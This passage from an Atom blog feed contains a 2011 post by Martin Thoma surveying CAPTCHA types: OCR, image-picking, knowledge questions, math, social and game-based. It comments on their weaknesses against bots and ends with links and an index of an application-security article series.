&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="Cybersecurity"></category><category term="AppSec"></category></entry><entry><title>CAPTCHA</title><link href="https://martin-thoma.com/captcha/" rel="alternate"></link><published>2011-09-29T09:20:35+02:00</published><updated>2011-09-29T09:20:35+02:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2011-09-29:/captcha/</id><summary type="html">&lt;p&gt;Spam is really a problem if you have a WordPress blog, a forum or a guestbook. A very common approach to solve this problem are CAPTCHAs - &lt;strong&gt;C&lt;/strong&gt;ompletely &lt;strong&gt;A&lt;/strong&gt;utomated &lt;strong&gt;P&lt;/strong&gt;ublic &lt;strong&gt;T&lt;/strong&gt;uring test to tell &lt;strong&gt;C&lt;/strong&gt;omputers and &lt;strong&gt;H&lt;/strong&gt;umans &lt;strong&gt;A&lt;/strong&gt;part.&lt;/p&gt;
&lt;p&gt;The idea behind CAPTCHAs is to ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;p&gt;Spam is really a problem if you have a WordPress blog, a forum or a guestbook. A very common approach to solve this problem are CAPTCHAs - &lt;strong&gt;C&lt;/strong&gt;ompletely &lt;strong&gt;A&lt;/strong&gt;utomated &lt;strong&gt;P&lt;/strong&gt;ublic &lt;strong&gt;T&lt;/strong&gt;uring test to tell &lt;strong&gt;C&lt;/strong&gt;omputers and &lt;strong&gt;H&lt;/strong&gt;umans &lt;strong&gt;A&lt;/strong&gt;part.&lt;/p&gt;
&lt;p&gt;The idea behind CAPTCHAs is to give the spammer a problem which is hard to solve for a computer program but easy to solve for a human.&lt;/p&gt;
&lt;p&gt;Most CAPTCHAs are really boring. I tried to find different categories of them, but most you will find online are in the "Optical character recognition" category:&lt;/p&gt;
&lt;h2 id="optical-character-recognition"&gt;Optical character recognition&lt;/h2&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/Web-Wiz-CAPTCHA.png"&gt;&lt;img alt="Web Wiz CAPTCHA" class="size-full wp-image-2751" src="../images/2011/09/Web-Wiz-CAPTCHA.png" style="max-width:310px;max-height:155px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;Web Wiz CAPTCHA&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;I hope nobody seriously pays the 6 Euro for &lt;a href="http://www.webwiz.co.uk/web-wiz-captcha/demo/"&gt;Web Wiz&lt;/a&gt;. As many very simple CAPTCHAs it lacks a support for blind people. It is quite easy to read for humans, but I guess also for bots. They always use only five random characters which are written in blue. They added some dots and straight lines to make segmentation more difficult. I guess they never tried to hack their own CAPTCHA. If they did, they should be aware that those small dots don't change anything and the straight lines can easily be detected and removed. It also seems to me as if they only used one font.&lt;/p&gt;
&lt;p&gt;Google did some great work with &lt;a href="http://www.google.com/recaptcha"&gt;reCAPTCHA&lt;/a&gt;. I think I'll write a longer post about this later, but to keep it short:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;They use the reader (or spammer) to digitalize the books they scan. So if someone uses very good algorithms to bypass their CAPTCHA, the spammer will help Google. This is a very nice way to end up in a win-win situation, isn't it?&lt;/li&gt;
&lt;li&gt;reCAPTCHA has also support for blind people.&lt;/li&gt;
&lt;li&gt;The characters you have to type in are actual words. This makes it a lot easier for humans to recognize the characters.&lt;/li&gt;
&lt;li&gt;reCAPTCHA is very easy to use. No need of &lt;a href="http://php.net/manual/en/book.image.php"&gt;GD&lt;/a&gt; or &lt;a href="http://www.php.net/manual/en/book.imagick.php"&gt;ImageMagick&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;If you can't read it, just reload it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here is a screenshot of reCAPTCHA:&lt;/p&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/reCAPTCHA.png"&gt;&lt;img alt="reCAPTCHA" class="size-full wp-image-2781" src="../images/2011/09/reCAPTCHA.png" style="max-width:338px;max-height:175px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;reCAPTCHA&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;Here is another "traditional" CAPTCHA example.&lt;/p&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/SimpleCaptcha.png"&gt;&lt;img alt="SimpleCaptcha" class="size-full wp-image-2831" src="../images/2011/09/SimpleCaptcha.png" style="max-width:219px;max-height:65px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;&lt;a href="http://simplecaptcha.sourceforge.net/"&gt;SimpleCaptcha&lt;/a&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h2 id="kittenauth"&gt;KittenAuth&lt;/h2&gt;
&lt;p&gt;I have never seen a working demo of &lt;a href="http://thepcspy.com/kittenauth/"&gt;KittenAuth&lt;/a&gt;, but the idea is simple: You get 9 pictures and you're supposed to spot the cats:&lt;/p&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/kittenAuth-captcha.jpg"&gt;&lt;img alt="kittenAuth CAPTCHA" class="size-full wp-image-2891" src="../images/2011/09/kittenAuth-captcha.jpg" style="max-width:382px;max-height:387px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;The KittenAuth system. Source: ThePCSpy.com&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;Very simmiliar is &lt;a href="http://research.microsoft.com/en-us/um/redmond/projects/asirra/"&gt;ASIRRA&lt;/a&gt;:&lt;/p&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/ASIRRA.png"&gt;&lt;img alt="ASIRRA" class="size-full wp-image-2941" src="../images/2011/09/ASIRRA.png" style="max-width:549px;max-height:511px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;ASIRRA&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h2 id="basic-human-knowledge"&gt;Basic human knowledge&lt;/h2&gt;
&lt;p&gt;Another CAPTCHA-type is based on basic human knowledge. &lt;a href="http://textcaptcha.com/"&gt;Text CAPTCHA&lt;/a&gt; is an example for this type. They ask you questions like:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Which of milk, hotel or brain is a body part?&lt;/li&gt;
&lt;li&gt;How many letters in "devotional"?&lt;/li&gt;
&lt;li&gt;The word "tamers" has which letter in 2nd position?&lt;/li&gt;
&lt;li&gt;Enter the smallest number of 28, thirteen, twenty, 60, fifty six or 78:&lt;/li&gt;
&lt;li&gt;Which of knee, leg, ear or ankle is above the waist?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I don't think this type is very good as the spammer has to do almost the same amount of work as the programmer. He has to parse the different types of questions, but I guess this isn't too hard.&lt;/p&gt;
&lt;p&gt;He might just ask Google: &lt;a href="http://www.google.com/search?q=what+is+7+minus+3+times+2%3F"&gt;what is 7 minus 3 times 2?&lt;/a&gt; or &lt;a href="http://www.google.com/search?q=the+number+of+horns+on+a+unicorn#sclient=psy-ab&amp;amp;hl=de&amp;amp;source=hp&amp;amp;q=what+is+the+number+of+horns+on+a+unicorn+times+the+answer+to+life%2C+the+universe%2C+and+everything%3F&amp;amp;pbx=1&amp;amp;oq=what+is+the+number+of+horns+on+a+unicorn+times+the+answer+to+life%2C+the+universe%2C+and+everything%3F&amp;amp;aq=f&amp;amp;aqi=&amp;amp;aql=&amp;amp;gs_sm=e&amp;amp;gs_upl=15192l15192l2l15913l1l1l0l0l0l0l281l281l2-1l1l0&amp;amp;bav=on.2,or.r_gc.r_pw.r_cp.&amp;amp;fp=1f755a13a5fe778&amp;amp;biw=1366&amp;amp;bih=630"&gt;what is the number of horns on a unicorn times the answer to life, the universe, and everything?&lt;/a&gt;.&lt;/p&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/egglue-Egglue-Semantic-CAPTCHA.png"&gt;&lt;img alt="egglue - Egglue Semantic CAPTCHA" class="size-full wp-image-2801" src="../images/2011/09/egglue-Egglue-Semantic-CAPTCHA.png" style="max-width:256px;max-height:143px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;&lt;a href="http://code.google.com/p/egglue/"&gt;egglue&lt;/a&gt; - Egglue Semantic CAPTCHA&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h2 id="mathematics"&gt;Mathematics&lt;/h2&gt;
&lt;p&gt;I've seen some CAPTCHAs asking for very basic math questions like the following one. They are very easy to bypass if you want to write a bot:&lt;/p&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/CAPTCHA-Basic-mathematics.png"&gt;&lt;img alt="CAPTCHA - Basic mathematics" class="size-full wp-image-2761" src="../images/2011/09/CAPTCHA-Basic-mathematics.png" style="max-width:212px;max-height:52px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;CAPTCHA - Basic mathematics (&lt;a href="http://mylittlehomepage.net/demos/captcha/index_math.php"&gt;example&lt;/a&gt;)&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;Sometimes they are not that easy:&lt;/p&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/Rosocosmos.jpg"&gt;&lt;img alt="Rosocosmos CAPTCHA" class="size-full wp-image-2901" src="../images/2011/09/Rosocosmos.jpg" style="max-width:520px;max-height:294px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;Rosocosmos CAPTCHA - Found on &lt;a href="http://haunty.hubpages.com/hub/22-Funny-Captchas"&gt;hubpages.com&lt;/a&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/Hard-math-CAPTCHA.png"&gt;&lt;img alt="Hard math CAPTCHA" class="size-full wp-image-2921" src="../images/2011/09/Hard-math-CAPTCHA.png" style="max-width:356px;max-height:207px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;Hard math CAPTCHA - found on &lt;a href="http://random.irb.hr/signup.php"&gt;random.irb.hr&lt;/a&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h2 id="social-captcha"&gt;Social CAPTCHA&lt;/h2&gt;
&lt;p&gt;I've just found Facebooks social CAPTCHA. I didn't read &lt;a href="http://blog.facebook.com/blog.php?post=486790652130"&gt;the article&lt;/a&gt;. I guess the idea is that you know the name of your friends, but a stranger doesn't. I had the same idea for a school website where you would have been forced to know the name of the teachers. Here is the example:&lt;/p&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/Social-CAPTCHA.png"&gt;&lt;img alt="Social CAPTCHA" class="size-full wp-image-2851" src="../images/2011/09/Social-CAPTCHA.png" style="max-width:539px;max-height:266px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;Social CAPTCHA&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h2 id="playthru"&gt;PLAYTHRU&lt;/h2&gt;
&lt;p&gt;To get through this CAPTCHA, you have to play a short game.&lt;/p&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/playthru-1.png"&gt;&lt;img alt="PLAYTHRU" class="size-full wp-image-43001" src="../images/2011/09/playthru-1.png" style="max-width:360px;max-height:160px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;PLAYTHRU&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;figure class="aligncenter"&gt;
&lt;a href="../images/2011/09/playthru-2.png"&gt;&lt;img alt="PLAYTHROU" class="size-full wp-image-43011" src="../images/2011/09/playthru-2.png" style="max-width:360px;max-height:160px"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;PLAYTHROU&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;You can get &lt;a href="http://areyouahuman.com/"&gt;PLAYTHRU&lt;/a&gt; here.&lt;/p&gt;
&lt;h2 id="further-reading"&gt;Further reading&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Fun:
  &lt;ul&gt;
&lt;li&gt;xkcd: &lt;a href="http://xkcd.com/233/"&gt;A New CAPTCHA Approach&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.smosh.com/smosh-pit/photos/24-wtf-captchas"&gt;24 WTF Captchas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.smosh.com/PC/smosh-pit/photos/25-very-naughty-facebook-captchas"&gt;25 Very Naughty Facebook Captchas&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Free CAPTCHA systems:
  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.google.com/recaptcha"&gt;reCAPTCHA&lt;/a&gt;: I recommend this one.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://code.google.com/p/cool-php-captcha/"&gt;cool php captcha&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.1stwebdesigner.com/freebies/captcha-solutions-kill-spam/"&gt;Fight with Spam: 15+ Free Captcha Solutions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Breaking or creating CAPTCHAs:
  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.blackhat-seo.com/2008/how-to-break-captchas/"&gt;How to break captchas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://caca.zoy.org/wiki/PWNtcha"&gt;PWNtcha&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.scribd.com/doc/24497942/Strong-CAPTCHA-Guidelines-v1-2"&gt;Strong CAPTCHA Guidelines&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="CAPTCHA"></category><category term="Spam"></category><category term="Security"></category><category term="Cybersecurity"></category></entry></feed>